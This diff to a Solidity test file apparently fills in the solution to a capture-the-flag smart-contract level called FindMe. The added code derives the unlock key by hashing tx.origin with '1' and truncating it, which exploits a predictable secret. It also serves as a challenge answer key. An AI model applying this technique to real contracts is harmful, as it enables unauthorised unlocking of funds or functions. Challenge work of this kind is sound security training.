@@ -20,7 +20,10 @@ contract FindMeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        bytes32 data1 = keccak256(abi.encodePacked(tx.origin, "1"));
+        bytes16 key = bytes16(data1);
+
+        instance.unLock(key);
 
         checkSuccess();
     }
